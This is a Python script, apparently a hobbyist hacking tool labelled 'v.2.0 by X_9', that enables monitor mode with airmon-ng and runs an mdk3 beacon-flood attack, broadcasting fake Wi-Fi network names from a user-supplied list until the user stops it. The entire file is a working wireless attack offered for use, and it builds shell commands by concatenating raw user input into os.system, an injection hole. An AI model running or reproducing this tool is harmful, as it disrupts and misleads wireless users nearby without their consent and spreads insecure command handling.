import psutil
import os
from colorama import Fore, Back, Style
def script():
    while True:
        print(Fore.GREEN +",------.         ,---.  ,------.  \n|  .---',-----. /  O  \ |  .--. ' \n|  `--, '-----'|  .-.  ||  '--' | \n|  |`          |  | |  ||  | --'  \n`--'           `--' `--'`--'      v.2.0 by X_9\n\nWELCOME TO MY TOOL :)\n\n--YOU'RE INTERFACES CARDS NAME'S:\n\n")

#INTERFACES:

        addrs = psutil.net_if_addrs()
        interface_names = list(addrs.keys())
        for name in interface_names:
            print(name)
        print(Fore.RED +"\n>>>IF YOU WANT TO EXIT TYPE: exit<<<")

        print("\n")

        inter = input(Fore.BLUE +"> enter the *name* of you're network adapter: ")

        if inter == "exit":
            print("\n\nTHANK YOU FOR USING MY TOOL :)")
            break

#SET LIST PATH:

        os.system("clear");print("\n")

        path = input("enter you're wifi name path. exm: .../../path.lst: ")

        os.system("airmon-ng start "+inter)
        print(Fore.RED + "\n\nSuccesfully monitor mode enabled\nAttack Start.\nAttack Start..\nAttack Start...\nAttack Start....\nAttack Start.....\n")
        os.system("mdk3 "+inter+" b -c 1 -f "+path)

#STOPPING THE SCRIPT

        x = input(Fore.GREEN +"do you want to stop the attack (y/n)?: ")
            
        if x == "n" or x =="no":
            os.system("airmon-ng start "+inter)
            print("\n\nSuccesfully monitor mode enabled\nAttack Start.\nAttack Start..\nAttack Start...\nAttack Start....\nAttack Start.....\n")
            os.system("mdk3 "+inter+" b -c 1 -f "+path)
            print(Fore.RED + "\n\nAttack Start.\nAttack Start..\nAttack Start...\nAttack Start....\nAttack Start.....\n")

            
        elif x == "y" or x == "yes":
            os.system("airmon-ng stop "+inter)
            os.system("systemctl restart NetworkManager")
            os.system("airmon-ng stop "+inter)
            os.system("airmon-ng check kill")
            os.system("airmon-ng stop "+inter)
            os.system("systemctl restart NetworkManager")
            os.system("clear")
            print(Fore.GREEN +"IF YOU HAVE A PROBLEMS IN THE INTERNET CONNECTION RESTART YOU'RE OS")
            print("\n\nTHANK YOU FOR USING MY TOOL :)")
            break
        else:

            def whil():

                while True:
                    x = input("do you want to stop the attack (y/n)?: ")


                    if x == "n" or x =="no":
                        os.system("airmon-ng start "+inter)
                        print("\n\nSuccesfully monitor mode enabled\nAttack Start.\nAttack Start..\nAttack Start...\nAttack Start....\nAttack Start.....\n")
                        os.system("mdk3 "+inter+" b -c 1 -f "+path)
                        print(Fore.RED + "\n\nAttack Start.\nAttack Start..\nAttack Start...\nAttack Start....\nAttack Start.....\n")
                    
                    elif x == "y" or x == "yes":
                        os.system("airmon-ng stop "+inter)
                        os.system("systemctl restart NetworkManager")
                        os.system("airmon-ng stop "+inter)
                        os.system("airmon-ng check kill")
                        os.system("airmon-ng stop "+inter)
                        os.system("systemctl restart NetworkManager")
                        os.system("clear")
                        print(Fore.GREEN +"IF YOU HAVE A PROBLEMS IN THE INTERNET CONNECTION RESTART YOU'RE OS")
                        print("\n\nTHANK YOU FOR USING MY TOOL :)")
                        break
                    else:
                        continue
            whil()
                
            
script()
        


#FINISH

#THANK FOR SUPPORT